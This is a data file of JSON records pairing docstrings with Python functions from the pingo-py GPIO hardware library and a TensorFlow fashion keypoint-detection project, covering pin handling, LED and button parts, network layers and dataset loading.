{"docstring": "\"\"\" Pin value as a float, by default from 0.0 to 1.0.\n\nThe ``from...`` and ``to...`` parameters work like in the Arduino map_\nfunction, converting values from an expected input range to a desired\noutput range.\n\n.. _map: http://arduino.cc/en/reference/map\n\"\"\"\n", "func_signal": "def ratio(self, from_min=0, from_max=None, to_min=0.0, to_max=1.0):\n", "code": "if from_max is None:\n    from_max = 2 ** self.bits - 1\n\n_value = self.value\nreturn (float(_value - from_min) * (to_max - to_min) /\n        (from_max - from_min) + to_min)", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"[property] Get/set pin state to ``pingo.HIGH`` or ``pingo.LOW``\"\"\"\n", "func_signal": "def state(self):\n", "code": "if self.mode not in [IN, OUT]:\n    raise WrongPinMode()\n\nif self.mode == IN:\n    self._state = self.board._get_pin_state(self)\n\nreturn self._state", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"\nThis method should be overwritten if the ``Board`` subclass\nhas this feature.\n\"\"\"\n", "func_signal": "def _get_pwm_frequency(self, pin):\n", "code": "if hasattr(pin, '_frequency'):\n    return pin._frequency\nreturn 0.0", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"\n:param switch: Switch instance to poll\n\"\"\"\n", "func_signal": "def __init__(self, switch):\n", "code": "self.switch = switch\nself.active = False", "path": "pingo\\parts\\button.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Initialize ``Pin`` instance with\n\nArguments:\n    ``board``\n        The board to which the pin is attached.\n    ``location``\n        Physical location of pin; ``int`` and ``str`` are\n        acceptable.\n    ``gpio_id``\n        Logical name of GPIO pin (e.g. ``sysfs`` file name).\n\"\"\"\n", "func_signal": "def __init__(self, board, location, gpio_id=None):\n", "code": "self.board = board\nself.location = location\nif gpio_id is not None:\n    self.gpio_id = gpio_id\nself._mode = None", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Stop blinking\"\"\"\n", "func_signal": "def stop(self):\n", "code": "if self.blinking:\n    self.blink_task.terminate()\n    self.blink_task = None", "path": "pingo\\parts\\led.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Populate ``board.pins`` mapping from ``Pin`` instances.\n\nThe ``__init__`` method of concrete ``Board`` subclasses should\ncall this method to populate the board instance ``pins`` mapping.\n\nArguments:\n    ``pins``: an iterable of ``Pin`` instances\n\"\"\"\n", "func_signal": "def _add_pins(self, pins):\n", "code": "self.pins = StrKeyDict()\nself.gpio = StrKeyDict()\nfor pin in pins:\n    self.pins[pin.location] = pin\n    if hasattr(pin, 'gpio_id'):\n        self.gpio[pin.gpio_id] = pin", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Get a list of pins that are instances of the given pin_types\n\nSee the ``digital_pins`` property for an example of use.\n\nArguments:\n    ``pin_types``: an iterable of types (usually, ``Pin`` subclasses)\n\"\"\"\n", "func_signal": "def filter_pins(self, *pin_types):\n", "code": "filtered = []\nfor pin_type in pin_types:\n    sub = [x for x in self.pins.values() if isinstance(x, pin_type)]\n    filtered += sub\n\nreturn filtered", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Abstract method to be implemented by each ``Board`` subclass.\n\nThe ``\u00abPwmPin\u00bb.value(\u2026)`` method calls this method because\nthe procedure to set PWM's duty cycle changes from board to board.\n\"\"\"\n\n", "func_signal": "def _set_pwm_duty_cycle(self, pin, value):\n", "code": "\n\"\"\"\nThis method should be overwritten if the ``Board`` subclass\nhas this feature.\n\"\"\"\nif hasattr(pin, '_duty_cycle'):\n    return pin._duty_cycle\nreturn 0.0", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "#import here, cause outside the eggs aren't loaded\n", "func_signal": "def run_tests(self):\n", "code": "import pytest\nerrno = pytest.main(self.test_args)\nsys.exit(errno)", "path": "setup.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"\n:param pin: A instance of DigitalPin\n\"\"\"\n", "func_signal": "def __init__(self, pin):\n", "code": "self.pin = pin\nself.pin.mode = 'IN'\nself.polling_task = None\nself._up_callback = lambda: None\nself._down_callback = lambda: None", "path": "pingo\\parts\\button.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "# Cleans previous PWM mode\n", "func_signal": "def _set_digital_mode(self, pin, mode):\n", "code": "if pin.mode == pingo.PWM:\n    if int(pin.location) in self._rpi_pwm:\n        self._rpi_pwm[int(pin.location)].stop()\n        del self._rpi_pwm[int(pin.location)]\n# Sets up new modes\nif mode == pingo.IN:\n    GPIO.setup(int(pin.gpio_id), GPIO.IN, pull_up_down=GPIO.PUD_DOWN)\nelif mode == pingo.OUT:\n    GPIO.setup(int(pin.gpio_id), GPIO.OUT)", "path": "pingo\\rpi\\rpi.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"\nCapability Response codes:\n    INPUT:  0, 1\n    OUTPUT: 1, 1\n    ANALOG: 2, 10\n    PWM:    3, 8\n    SERV0:  4, 14\n    I2C:    6, 1\n\"\"\"\n\n", "func_signal": "def pin_list_to_board_dict(capability_query_response):\n", "code": "board_dict = {\n    'digital': [],\n    'analog': [],\n    'pwm': [],\n    'servo': [],\n    'i2c': [],\n    'disabled': [],\n}\n\n# i split pins of list:\npin_list = [[]]\nfor b in capability_query_response:\n    if b == 127:\n        pin_list.append([])\n    else:\n        pin_list[-1].append(b)\n\npin_list.pop()  # removes the empty [] on end\n\n# Finds the capability of each pin\nfor i, pin in enumerate(pin_list):\n    if not pin:\n        board_dict['disabled'] += [i]\n        board_dict['digital'] += [i]\n        continue\n\n    for j, _ in enumerate(pin):\n        # Iterate over evens\n        if j % 2 == 0:\n            # This is safe. try: range(10)[5:50]\n            if pin[j:j + 4] == [0, 1, 1, 1]:\n                board_dict['digital'] += [i]\n\n            if pin[j:j + 2] == [2, 10]:\n                board_dict['analog'] += [i]\n\n            if pin[j:j + 2] == [3, 8]:\n                board_dict['pwm'] += [i]\n\n            if pin[j:j + 2] == [4, 14]:\n                board_dict['servo'] += [i]\n\n            if pin[j:j + 2] == [6, 1]:\n                board_dict['i2c'] += [i]\n\n# We have to deal with analog pins:\n# - (14, 15, 16, 17, 18, 19)\n# + (0, 1, 2, 3, 4, 5)\ndiff = set(board_dict['digital']) - set(board_dict['analog'])\nboard_dict['analog'] = [n for n, _ in enumerate(board_dict['analog'])]\n\n# Digital pin problems:\n# - (2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)\n# + (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13)\n\nboard_dict['digital'] = [n for n, _ in enumerate(diff)]\n# Based on lib Arduino 0017\nboard_dict['servo'] = board_dict['digital']\n\n# Turn lists into tuples\n# Using dict for Python 2.6 compatibility\nboard_dict = dict([\n    (key, tuple(value))\n    for key, value\n    in board_dict.items()\n])\n\nreturn board_dict", "path": "pingo\\arduino\\util_firmata.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Generate a pulse in state of the pin.\"\"\"\n", "func_signal": "def pulse(self):\n", "code": "if self.state == LOW:\n    self.state = HIGH\n    self.state = LOW\nelse:\n    self.state = LOW\n    self.state = HIGH", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"\n:param board: the board to which this ping belongs\n:param location: the physical location of the pin on the board\n:param resolution: resolution of the AD converter in bits\n:param gpio_id: the logical id for GPIO access, if applicable\n\"\"\"\n", "func_signal": "def __init__(self, board, location, resolution, gpio_id=None):\n", "code": "Pin.__init__(self, board, location, gpio_id)\nself.bits = resolution\nself._mode = None", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"\n:param times: number of times to blink (0=forever)\n:param on_delay: delay while LED is on\n:param off_delay: delay while LED is off\n\"\"\"\n", "func_signal": "def blink(self, times=3, on_delay=.5, off_delay=None):\n", "code": "if self.blinking:\n    self.stop()\nself.blink_task = BlinkTask(self, times, on_delay, off_delay)\nthreading.Thread(target=self.blink_task.run).start()", "path": "pingo\\parts\\led.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Get list of pins from iterable of locations\"\"\"\n", "func_signal": "def select_pins(self, locations):\n", "code": "locations = list(locations)\nreturn [self.pins[location] for location in locations]", "path": "pingo\\board.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Set lit_state to pingo.LOW to turn on led by bringing\n   cathode to low state.\n\n:param lit_state: use pingo.HI for anode control, pingo.LOW\n                  for cathode control\n\"\"\"\n\n", "func_signal": "def __init__(self, pin, lit_state=pingo.HIGH):\n", "code": "pin.mode = pingo.OUT\nself.pin = pin\nself.lit_state = lit_state\nself.blink_task = None", "path": "pingo\\parts\\led.py", "repo_name": "pingo-io/pingo-py", "stars": 257, "license": "mit", "language": "python", "size": 30387}
{"docstring": "\"\"\"Split input features and labes into batches.\"\"\"\n\n", "func_signal": "def _split_batch(features, labels, number_of_shards, device):\n", "code": "def ensure_divisible_by_shards(sequence):\n  batch_size = ops_lib.convert_to_tensor(sequence).get_shape()[0]\n  if batch_size % number_of_shards != 0:\n    raise ValueError(\n        'Batch size {} needs to be divisible by the number of GPUs, which '\n        'is {}.'.format(batch_size, number_of_shards))\n\ndef split_dictionary(dictionary):\n  \"\"\"Split a dictionary into shards.\"\"\"\n  shards = [{} for _ in range(number_of_shards)]\n  for name, tensor in six.iteritems(dictionary):\n    if isinstance(tensor, sparse_tensor.SparseTensor):\n      for i, shard in enumerate(\n          sparse_ops.sparse_split(\n              sp_input=tensor, num_split=number_of_shards, axis=0)):\n        shards[i][name] = shard\n    else:\n      ensure_divisible_by_shards(tensor)\n      for i, shard in enumerate(array_ops.split(tensor, number_of_shards)):\n        shards[i][name] = shard\n  return shards\n\nwith ops_lib.name_scope('split_inputs'):\n  with ops_lib.device(device):\n    if isinstance(features, dict):\n      feature_shards = split_dictionary(features)\n    else:\n      ensure_divisible_by_shards(features)\n      feature_shards = array_ops.split(features, number_of_shards)\n\n    if labels is None:\n      label_shards = None\n    elif isinstance(labels, dict):\n      label_shards = split_dictionary(labels)\n    else:\n      ensure_divisible_by_shards(labels)\n      label_shards = array_ops.split(labels, number_of_shards)\nreturn feature_shards, label_shards", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Performs a batch normalization using a standard set of parameters.\"\"\"\n# We set fused=True for a significant performance boost. See\n# https://www.tensorflow.org/performance/performance_guide#common_fused_ops\n", "func_signal": "def batch_norm(inputs, training, data_format, name=None):\n", "code": "return tf.layers.batch_normalization(\n    inputs=inputs, axis=1 if data_format == 'channels_first' else 3,\n    momentum=_BATCH_NORM_DECAY, epsilon=_BATCH_NORM_EPSILON, center=True,\n    scale=True, training=training, name=name, fused=_USE_FUSED_BN)", "path": "net\\detnet_cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Get gradients across towers for the last called optimizer.\"\"\"\n", "func_signal": "def get_latest_gradients_from_all_towers(self):\n", "code": "grads_and_vars = []\nindex_of_last_gradients = len(\n    self._collected_grads_and_vars[self._current_tower_index]) - 1\nfor tower_id in range(self._current_tower_index + 1):\n  grads_and_vars.extend(\n      self._collected_grads_and_vars[tower_id][index_of_last_gradients])\nreturn grads_and_vars", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Initializer function.\"\"\"\n", "func_signal": "def constant_xavier_initializer(shape, group, dtype=tf.float32, uniform=True):\n", "code": "if not dtype.is_floating:\n  raise TypeError('Cannot create initializer for non-floating point type.')\n# Estimating fan_in and fan_out is not possible to do perfectly, but we try.\n# This is the right thing for matrix multiply and convolutions.\nif shape:\n  fan_in = float(shape[-2]) if len(shape) > 1 else float(shape[-1])\n  fan_out = float(shape[-1])/group\nelse:\n  fan_in = 1.0\n  fan_out = 1.0\nfor dim in shape[:-2]:\n  fan_in *= float(dim)\n  fan_out *= float(dim)\n\n# Average number of inputs and output connections.\nn = (fan_in + fan_out) / 2.0\nif uniform:\n  # To get stddev = math.sqrt(factor / n) need to adjust for uniform.\n  limit = math.sqrt(3.0 * 1.0 / n)\n  return tf.random_uniform(shape, -limit, limit, dtype, seed=None)\nelse:\n  # To get stddev = math.sqrt(factor / n) need to adjust for truncated.\n  trunc_stddev = math.sqrt(1.3 * 1.0 / n)\n  return tf.truncated_normal(shape, 0.0, trunc_stddev, dtype, seed=None)", "path": "net\\detxt_cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"`model_fn` on a single device without reduction overhead.\"\"\"\n", "func_signal": "def single_device_model_fn(features, labels, mode, params=None, config=None):\n", "code": "return _get_loss_towers(\n    model_fn=model_fn,\n    mode=mode,\n    features=[features],\n    labels=[labels],\n    params=params,\n    loss_reduction=loss_reduction,\n    config=config,\n    devices=devices,\n    local_ps_devices=ps_devices)[0]  # One device, so one spec is out.", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Performs a batch normalization using a standard set of parameters.\"\"\"\n# We set fused=True for a significant performance boost. See\n# https://www.tensorflow.org/performance/performance_guide#common_fused_ops\n", "func_signal": "def batch_norm(inputs, training, data_format, name=None):\n", "code": "return tf.layers.batch_normalization(\n    inputs=inputs, axis=1 if data_format == 'channels_first' else 3,\n    momentum=_BATCH_NORM_DECAY, epsilon=_BATCH_NORM_EPSILON, center=True,\n    scale=True, training=training, name=name, fused=_USE_FUSED_BN)", "path": "net\\cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Pads the input along the spatial dimensions independently of input size.\n\nArgs:\n  inputs: A tensor of size [batch, channels, height_in, width_in] or\n    [batch, height_in, width_in, channels] depending on data_format.\n  kernel_size: The kernel to be used in the conv2d or max_pool2d operation.\n               Should be a positive integer.\n  data_format: The input format ('channels_last' or 'channels_first').\n\nReturns:\n  A tensor with the same format as the input with the data either intact\n  (if kernel_size == 1) or padded (if kernel_size > 1).\n\"\"\"\n", "func_signal": "def fixed_padding(inputs, kernel_size, data_format):\n", "code": "pad_total = kernel_size - 1\npad_beg = pad_total // 2\npad_end = pad_total - pad_beg\n\nif data_format == 'channels_first':\n    padded_inputs = tf.pad(inputs, [[0, 0], [0, 0],\n                                  [pad_beg, pad_end], [pad_beg, pad_end]])\nelse:\n    padded_inputs = tf.pad(inputs, [[0, 0], [pad_beg, pad_end],\n                                  [pad_beg, pad_end], [0, 0]])\nreturn padded_inputs", "path": "net\\detxt_cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "#with tf.variable_scope('resnet50', 'resnet50', values=[inputs]):\n", "func_signal": "def cascaded_pyramid_net(inputs, output_channals, heatmap_size, istraining, data_format):\n", "code": "end_points = cpn_backbone(inputs, istraining, data_format)\npyramid_len = len(end_points)\nup_sampling = None\npyramid_heatmaps = []\npyramid_laterals = []\nwith tf.variable_scope('feature_pyramid', 'feature_pyramid', values=end_points):\n    # top-down\n    for ind, pyramid in enumerate(reversed(end_points)):\n        inputs = conv2d_fixed_padding(inputs=pyramid, filters=256, kernel_size=1, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='1x1_conv1_p{}'.format(pyramid_len - ind))\n        lateral = tf.nn.relu(inputs, name='relu1_p{}'.format(pyramid_len - ind))\n        if up_sampling is not None:\n            if data_format == 'channels_first':\n                up_sampling = tf.transpose(up_sampling, [0, 2, 3, 1], name='trans_p{}'.format(pyramid_len - ind))\n            up_sampling = tf.image.resize_bilinear(up_sampling, tf.shape(up_sampling)[-3:-1] * 2, name='upsample_p{}'.format(pyramid_len - ind))\n            if data_format == 'channels_first':\n                up_sampling = tf.transpose(up_sampling, [0, 3, 1, 2], name='trans_inv_p{}'.format(pyramid_len - ind))\n            up_sampling = conv2d_fixed_padding(inputs=up_sampling, filters=256, kernel_size=1, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='up_conv_p{}'.format(pyramid_len - ind))\n            up_sampling = lateral + up_sampling\n            lateral = up_sampling\n        else:\n            up_sampling = lateral\n\n        pyramid_laterals.append(lateral)\n\n        lateral = conv2d_fixed_padding(inputs=lateral, filters=256, kernel_size=1, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='1x1_conv2_p{}'.format(pyramid_len - ind))\n        lateral = tf.nn.relu(lateral, name='relu2_p{}'.format(pyramid_len - ind))\n\n        outputs = conv2d_fixed_padding(inputs=lateral, filters=output_channals, kernel_size=3, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='conv_heatmap_p{}'.format(pyramid_len - ind))\n        if data_format == 'channels_first':\n            outputs = tf.transpose(outputs, [0, 2, 3, 1], name='output_trans_p{}'.format(pyramid_len - ind))\n        outputs = tf.image.resize_bilinear(outputs, [heatmap_size, heatmap_size], name='heatmap_p{}'.format(pyramid_len - ind))\n        if data_format == 'channels_first':\n            outputs = tf.transpose(outputs, [0, 3, 1, 2], name='heatmap_trans_inv_p{}'.format(pyramid_len - ind))\n        pyramid_heatmaps.append(outputs)\nwith tf.variable_scope('global_net', 'global_net', values=pyramid_laterals):\n    global_pyramids = []\n    for ind, lateral in enumerate(pyramid_laterals):\n        inputs = lateral\n        for bottleneck_ind in range(pyramid_len - ind - 1):\n            inputs = global_net_bottleneck_block(inputs, 128, istraining, data_format, name='global_net_bottleneck_{}_p{}'.format(bottleneck_ind, pyramid_len - ind))\n\n        #if ind < pyramid_len - 1:\n            # resize back to the output heatmap size\n        if data_format == 'channels_first':\n            outputs = tf.transpose(inputs, [0, 2, 3, 1], name='global_output_trans_p{}'.format(pyramid_len - ind))\n        else:\n            outputs = inputs\n        outputs = tf.image.resize_bilinear(outputs, [heatmap_size, heatmap_size], name='global_heatmap_p{}'.format(pyramid_len - ind))\n        if data_format == 'channels_first':\n            outputs = tf.transpose(outputs, [0, 3, 1, 2], name='global_heatmap_trans_inv_p{}'.format(pyramid_len - ind))\n        # else:\n        #     outputs = tf.identity(inputs, 'global_heatmap_p{}'.format(pyramid_len - ind))\n\n        global_pyramids.append(outputs)\n\n    concat_pyramids = tf.concat(global_pyramids, 1 if data_format == 'channels_first' else 3, name='concat')\n\n    def projection_shortcut(inputs):\n        return conv2d_fixed_padding(inputs=inputs, filters=256, kernel_size=1, strides=1, data_format=data_format, name='shortcut')\n\n    outputs = global_net_bottleneck_block(concat_pyramids, 128, istraining, data_format, projection_shortcut=projection_shortcut, name='global_concat_bottleneck')\n    outputs = conv2d_fixed_padding(inputs=outputs, filters=output_channals, kernel_size=3, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='conv_heatmap')\n\n\nreturn pyramid_heatmaps + [outputs]", "path": "net\\cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "# Allowing None in the signature so that dataset_factory can use the default.\n", "func_signal": "def slim_get_split(dataset_dir, image_preprocessing_fn, batch_size, num_readers, num_preprocessing_threads, num_epochs=None, is_training=True, category='blouse', file_pattern='{}_????', reader=None, return_keypoints=False):\n", "code": "if reader is None:\n    reader = tf.TFRecordReader\n\nnum_joints = config.class_num_joints[category]\n\nsuffix = '.tfrecord' if is_training else '_val.tfrecord'\nfile_pattern = file_pattern.format(category) + suffix\n# Features in Pascal VOC TFRecords.\nkeys_to_features = {\n    'image/encoded': tf.FixedLenFeature((), tf.string, default_value=''),\n    'image/filename': tf.FixedLenFeature((), tf.string, default_value=''),\n    'image/format': tf.FixedLenFeature((), tf.string, default_value='jpeg'),\n    'image/height': tf.FixedLenFeature([1], tf.int64),\n    'image/width': tf.FixedLenFeature([1], tf.int64),\n    'image/channels': tf.FixedLenFeature([1], tf.int64),\n    'image/classid': tf.FixedLenFeature([1], tf.int64),\n    'image/keypoint/x': tf.VarLenFeature(dtype=tf.int64),\n    'image/keypoint/y': tf.VarLenFeature(dtype=tf.int64),\n    'image/keypoint/v': tf.VarLenFeature(dtype=tf.int64),\n    'image/keypoint/id': tf.VarLenFeature(dtype=tf.int64),\n    'image/keypoint/gid': tf.VarLenFeature(dtype=tf.int64),\n}\nitems_to_handlers = {\n    'image': slim.tfexample_decoder.Image('image/encoded', 'image/format'),\n    'height': slim.tfexample_decoder.Tensor('image/height'),\n    'width': slim.tfexample_decoder.Tensor('image/width'),\n    'channels': slim.tfexample_decoder.Tensor('image/channels'),\n    'classid': slim.tfexample_decoder.Tensor('image/classid'),\n    'keypoint/x': slim.tfexample_decoder.Tensor('image/keypoint/x'),\n    'keypoint/y': slim.tfexample_decoder.Tensor('image/keypoint/y'),\n    'keypoint/v': slim.tfexample_decoder.Tensor('image/keypoint/v'),\n    'keypoint/id': slim.tfexample_decoder.Tensor('image/keypoint/id'),\n    'keypoint/gid': slim.tfexample_decoder.Tensor('image/keypoint/gid'),\n}\ndecoder = slim.tfexample_decoder.TFExampleDecoder(keys_to_features, items_to_handlers)\n\ninput_source = os.path.join(dataset_dir, file_pattern)\ndataset = slim.dataset.Dataset(\n            data_sources=input_source,\n            reader=reader,\n            decoder=decoder,\n            num_samples=config.split_size[category]['train' if is_training else 'val'],#dataset_inspect.count_split_examples(dataset_dir, file_prefix='sacw_'),\n            items_to_descriptions=None,\n            num_classes=num_joints,\n            labels_to_names=None)\n\nwith tf.name_scope('dataset_data_provider'):\n    provider = slim.dataset_data_provider.DatasetDataProvider(\n                                                    dataset,\n                                                    num_readers=num_readers,\n                                                    common_queue_capacity=32 * batch_size,\n                                                    common_queue_min=8 * batch_size,\n                                                    shuffle=True,\n                                                    num_epochs=num_epochs)\n\n[org_image, height, width, channels, classid, key_x, key_y, key_v, key_id, key_gid] = provider.get(['image', 'height',\n                                                                                        'width', 'channels',\n                                                                                        'classid', 'keypoint/x',\n                                                                                        'keypoint/y', 'keypoint/v',\n                                                                                        'keypoint/id', 'keypoint/gid'])\n\n\ngather_ind = config.class2global_ind_map[category]\n\nkey_x, key_y, key_v, key_id, key_gid = tf.gather(key_x, gather_ind), tf.gather(key_y, gather_ind), tf.gather(key_v, gather_ind), tf.gather(key_id, gather_ind), tf.gather(key_gid, gather_ind)\n\nshape = tf.stack([height, width, channels], axis=0)\n\nif not return_keypoints:\n    image, targets, new_key_v, isvalid, norm_value = image_preprocessing_fn(org_image, classid, shape, key_x, key_y, key_v)\n    batch_list = [image, shape, classid, targets, new_key_v, isvalid, norm_value]\nelse:\n    image, targets, new_key_x, new_key_y, new_key_v, isvalid, norm_value = image_preprocessing_fn(org_image, classid, shape, key_x, key_y, key_v)\n    batch_list = [image, shape, classid, targets, new_key_x, new_key_y, new_key_v, isvalid, norm_value]\n\nbatch_input = tf.train.batch(batch_list,\n                            #classid, key_x, key_y, key_v, key_id, key_gid],\n                            dynamic_pad=False,#(not is_training),\n                            batch_size = batch_size,\n                            allow_smaller_final_batch=True,\n                            num_threads = num_preprocessing_threads,\n                            capacity = 64 * batch_size)\nreturn batch_input", "path": "preprocessing\\dataset.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Strided 2-D convolution with explicit padding.\"\"\"\n# The padding is consistent and is based only on `kernel_size`, not on the\n# dimensions of `inputs` (as opposed to using `tf.layers.conv2d` alone).\n", "func_signal": "def conv2d_fixed_padding(inputs, filters, kernel_size, strides, data_format, kernel_initializer=tf.glorot_uniform_initializer, name=None):\n", "code": "if strides > 1:\n    inputs = fixed_padding(inputs, kernel_size, data_format)\n\nreturn tf.layers.conv2d(\n            inputs=inputs, filters=filters, kernel_size=kernel_size, strides=strides,\n            padding=('SAME' if strides == 1 else 'VALID'), use_bias=False,\n            kernel_initializer=kernel_initializer(),\n            data_format=data_format, name=name)", "path": "net\\detnet_cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "#with tf.variable_scope('resnet50', 'resnet50', values=[inputs]):\n", "func_signal": "def head_xt_cascaded_pyramid_net(inputs, output_channals, heatmap_size, istraining, data_format):\n", "code": "end_points = sext_cpn_backbone(inputs, istraining, data_format)\npyramid_len = len(end_points)\nup_sampling = None\npyramid_heatmaps = []\npyramid_laterals = []\nwith tf.variable_scope('feature_pyramid', 'feature_pyramid', values=end_points):\n    # top-down\n    for ind, pyramid in enumerate(reversed(end_points)):\n        inputs = conv2d_fixed_padding(inputs=pyramid, filters=256, kernel_size=1, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='1x1_conv1_p{}'.format(pyramid_len - ind + 1))\n        lateral = tf.nn.relu(inputs, name='relu1_p{}'.format(pyramid_len - ind + 1))\n        if up_sampling is not None:\n            if ind > pyramid_len - 2:\n                if data_format == 'channels_first':\n                    up_sampling = tf.transpose(up_sampling, [0, 2, 3, 1], name='trans_p{}'.format(pyramid_len - ind + 1))\n                up_sampling = tf.image.resize_bilinear(up_sampling, tf.shape(up_sampling)[-3:-1] * 2, name='upsample_p{}'.format(pyramid_len - ind + 1))\n                if data_format == 'channels_first':\n                    up_sampling = tf.transpose(up_sampling, [0, 3, 1, 2], name='trans_inv_p{}'.format(pyramid_len - ind + 1))\n                up_sampling = conv2d_fixed_padding(inputs=up_sampling, filters=256, kernel_size=1, strides=1,\n                          data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='up_conv_p{}'.format(pyramid_len - ind + 1))\n            up_sampling = lateral + up_sampling\n            lateral = up_sampling\n        else:\n            up_sampling = lateral\n\n        pyramid_laterals.append(lateral)\n\n        lateral = conv2d_fixed_padding(inputs=lateral, filters=256, kernel_size=1, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='1x1_conv2_p{}'.format(pyramid_len - ind + 1))\n        lateral = tf.nn.relu(lateral, name='relu2_p{}'.format(pyramid_len - ind + 1))\n\n        outputs = conv2d_fixed_padding(inputs=lateral, filters=output_channals, kernel_size=3, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='conv_heatmap_p{}'.format(pyramid_len - ind + 1))\n        if data_format == 'channels_first':\n            outputs = tf.transpose(outputs, [0, 2, 3, 1], name='output_trans_p{}'.format(pyramid_len - ind + 1))\n        outputs = tf.image.resize_bilinear(outputs, [heatmap_size, heatmap_size], name='heatmap_p{}'.format(pyramid_len - ind + 1))\n        if data_format == 'channels_first':\n            outputs = tf.transpose(outputs, [0, 3, 1, 2], name='heatmap_trans_inv_p{}'.format(pyramid_len - ind + 1))\n        pyramid_heatmaps.append(outputs)\nwith tf.variable_scope('global_net', 'global_net', values=pyramid_laterals):\n    global_pyramids = []\n    for ind, lateral in enumerate(pyramid_laterals):\n        inputs = lateral\n        for bottleneck_ind in range(pyramid_len - ind - 1):\n            inputs = global_net_sext_bottleneck_block(inputs, 128, istraining, data_format, name_prefix='global_net_bottleneck_{}_p{}'.format(bottleneck_ind, pyramid_len - ind))\n\n        #if ind < pyramid_len - 1:\n            # resize back to the output heatmap size\n        if data_format == 'channels_first':\n            outputs = tf.transpose(inputs, [0, 2, 3, 1], name='global_output_trans_p{}'.format(pyramid_len - ind))\n        else:\n            outputs = inputs\n        outputs = tf.image.resize_bilinear(outputs, [heatmap_size, heatmap_size], name='global_heatmap_p{}'.format(pyramid_len - ind))\n        if data_format == 'channels_first':\n            outputs = tf.transpose(outputs, [0, 3, 1, 2], name='global_heatmap_trans_inv_p{}'.format(pyramid_len - ind))\n        # else:\n        #     outputs = tf.identity(inputs, 'global_heatmap_p{}'.format(pyramid_len - ind))\n\n        global_pyramids.append(outputs)\n\n    concat_pyramids = tf.concat(global_pyramids, 1 if data_format == 'channels_first' else 3, name='concat')\n\n    outputs = global_net_sext_bottleneck_block(concat_pyramids, 128, istraining, data_format, need_reduce=True, name_prefix='global_concat_bottleneck')\n\n    outputs = conv2d_fixed_padding(inputs=outputs, filters=output_channals, kernel_size=3, strides=1,\n                      data_format=data_format, kernel_initializer=tf.glorot_uniform_initializer, name='conv_heatmap')\n\n\nreturn pyramid_heatmaps + [outputs]", "path": "net\\detxt_cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", 